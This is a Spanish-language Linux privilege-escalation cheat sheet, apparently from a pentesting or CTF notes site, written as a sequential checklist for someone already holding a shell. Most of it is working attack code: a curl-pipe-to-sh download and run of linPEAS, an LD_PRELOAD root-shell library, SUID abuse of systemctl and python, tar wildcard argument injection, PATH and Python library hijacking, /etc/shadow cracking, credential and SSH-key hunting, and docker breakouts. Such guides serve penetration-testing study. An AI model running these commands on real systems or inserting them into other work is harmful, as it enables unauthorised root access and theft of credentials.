---
title: "Guía Maestra Linux PrivEsc"
layout: "single"
category: "Linux PrivEsc"
slug: "linux-privesc/guia-maestra"
date: "2025-11-26"
---

Esta guía unifica técnicas de escalada de privilegios en Linux. Úsala como checklist secuencial cuando tengas acceso inicial (shell) y necesites ser root.

## 1. Enumeración Rápida & Automatizada
Antes de enumerar manualmente, busca "fruta madura" (Low Hanging Fruit).

* **[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS):** `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
* **[Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester):** Para buscar Kernel Exploits (DirtyCow, etc).
* **[Pspy](https://github.com/DominicBreuker/pspy):** Para monitorizar procesos y cronjobs en tiempo real sin ser root.

---

## 2. Enumeración Manual (La Base)

### Información del Sistema
```bash
hostname
uname -a                # Kernel version (Buscar CVEs)
cat /etc/*-release      # Distribución exacta
env                     # Variables de entorno (¿Claves? ¿Rutas raras?)
```

### Usuarios y Grupos
```bash
whoami
id                      # ¡CRÍTICO! Mira si estás en grupos: docker, lxd, disk, adm, sudo, wheel
sudo -l                 # ¡LO PRIMERO QUE HAY QUE HACER!
cat /etc/passwd | cut -d: -f1    # Listar usuarios
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # ¿Hay otro root?
```

### Red y Puertos (Internos)
Buscar servicios que solo escuchan en local (127.0.0.1) como MySQL, Paneles Admin, etc.
```bash
netstat -tulnp
ss -tulnp
```

---

## 3. Abusando de SUDO (`sudo -l`)

Si `sudo -l` muestra que puedes ejecutar binarios sin contraseña (`NOPASSWD`), busca siempre en **[GTFOBins](https://gtfobins.github.io/)**.

### Pivoting a otro usuario (Lateral Movement)
Si puedes ejecutar un comando como otro usuario (ej. `toby`), puedes obtener su shell:
```bash
sudo -u toby /bin/bash
sudo -u toby vim
```

### Exploits Comunes de Sudo (GTFOBins Classics)
**Vim / Vi / Nano**
```bash
sudo vim -c ':!/bin/sh'
# O dentro de vim presiona ESC y escribe: 
# :set shell=/bin/sh
# :shell
```

**Less / More / Man**
Si el binario te muestra paginación (como `less`), estando dentro escribe:
```text
!/bin/sh
```

**LD_PRELOAD**
Si ves `env_keep+=LD_PRELOAD` en la salida de `sudo -l`:
1. Crear `pe.c`:
   ```c
   #include <stdio.h>
   #include <sys/types.h>
   #include <stdlib.h>
   void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
   ```
2. Compilar: `gcc -fPIC -shared -o pe.so pe.c -nostartfiles`
3. Ejecutar: `sudo LD_PRELOAD=/tmp/pe.so <comando_permitido>`

---

## 4. Permisos SUID / SGID
Busca binarios que se ejecuten con permisos del dueño (generalmente root) independientemente de quién los lance.

```bash
find / -perm -4000 2>/dev/null  # Buscar SUID
find / -perm -2000 2>/dev/null  # Buscar SGID
```

### Exploits Específicos SUID

**Systemctl (SUID)**
Si puedes crear servicios, crea uno que te haga root:
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
# Luego ejecuta: bash -p
```

**Python (SUID)**
```bash
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Pkexec (PwnKit - CVE-2021-4034)**
Si `pkexec` tiene SUID, usar exploit [PwnKit](https://github.com/ly4k/PwnKit).

**Nmap (Versiones antiguas)**
`nmap --interactive` -> `!sh`

---

## 5. Capabilities
Si Sudo y SUID fallan, mira las capabilities. Es un control de acceso más granular.
```bash
getcap -r / 2>/dev/null
```

**Python con Capability `cap_setuid+ep`**
Si Python la tiene, eres root:
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 6. Cronjobs y Timers
Busca tareas programadas que ejecuten scripts.
```bash
cat /etc/crontab
ls -la /etc/cron.d
ps -aux | grep cron
```

### Vectores de Ataque Cron
1.  **Archivo Editable:** Si el script que ejecuta root (`backup.py`) es editable por ti -> Escribe una reverse shell dentro.
2.  **Archivo No Existe:** Si cron intenta ejecutar `/home/user/backup.sh` y el archivo no existe (pero puedes escribir en la carpeta) -> Crea el archivo malicioso con ese nombre.
3.  **Wildcards (*):** Si el cron ejecuta `tar czf *` en una carpeta donde puedes escribir.
    ```bash
    touch -- "--checkpoint=1"
    touch -- "--checkpoint-action=exec=sh runme.sh"
    # En runme.sh metes tu reverse shell
    ```

---

## 7. Hijacking (Secuestro de Rutas)

### PATH Hijacking
Si un script SUID o de root ejecuta un comando **sin ruta absoluta** (ej: ejecuta `ifconfig` en lugar de `/sbin/ifconfig`):

1.  Comprobar PATH: `echo $PATH`
2.  Crear script malicioso en `/tmp`: 
    ```bash
    echo "/bin/bash" > /tmp/ifconfig
    chmod +x /tmp/ifconfig
    ```
3.  Modificar PATH para que busque primero en `/tmp`: 
    ```bash
    export PATH=/tmp:$PATH
    ```
4.  Ejecutar el binario vulnerable.

### Python Library Hijacking
Si un script de python (ej: `vuln.py` ejecutado por root) importa una librería (ej: `import random`) y tienes permisos de escritura en la carpeta del script:

1.  Crear `random.py` en la misma carpeta que `vuln.py`.
    ```python
    import os
    os.system("/bin/bash")
    ```
2.  Ejecutar `vuln.py` (o esperar a que el cron lo ejecute).

---

## 8. Archivos Sensibles y Contraseñas

### Crackear /etc/shadow
Si puedes leer `/etc/shadow` (fallo de permisos):
1.  Copiar contenido de `/etc/passwd` y `/etc/shadow` a tu máquina atacante.
2.  Combinar: `unshadow passwd.txt shadow.txt > hash.txt`
3.  Crackear: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

### Claves SSH
Buscar claves privadas (`id_rsa`) legibles.
```bash
find / -name id_rsa 2>/dev/null
# Si tiene password, crackear con ssh2john.py y john.
```

### Contraseñas en Ficheros (Grep)
```bash
grep -rEi "pass|pwd|user|credential" /home/ 2>/dev/null
grep -rEi "password" /var/www/ 2>/dev/null
grep -rEi "DB_PASS" /var/www/html/wp-config.php  # Wordpress
```

---

## 9. Docker & Contenedores

**¿Estás en un Docker?** (`ls -la /` ves el archivo `.dockerenv` o `cgroups`).

**Docker Breakout (Si eres root DENTRO del docker)**
Intenta montar el disco duro de la máquina real (Host) dentro del contenedor:
```bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host
# Si funciona, tienes acceso a TODO el sistema de ficheros real en /mnt/host
chroot /mnt/host
```

**Grupo Docker (En el Host)**
Si tu usuario en la máquina víctima está en el grupo `docker`, eres root de facto:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## 10. Kernel Exploits (Último Recurso)
Solo usar si todo lo anterior falla. Puede crashear la máquina.
* **DirtyCow (CVE-2016-5195):** Kernels viejos (2.6 - 3.x).
* **PwnKit (CVE-2021-4034):** Pkexec.
* **Baron Samedit (CVE-2021-3156):** Sudo heap overflow.
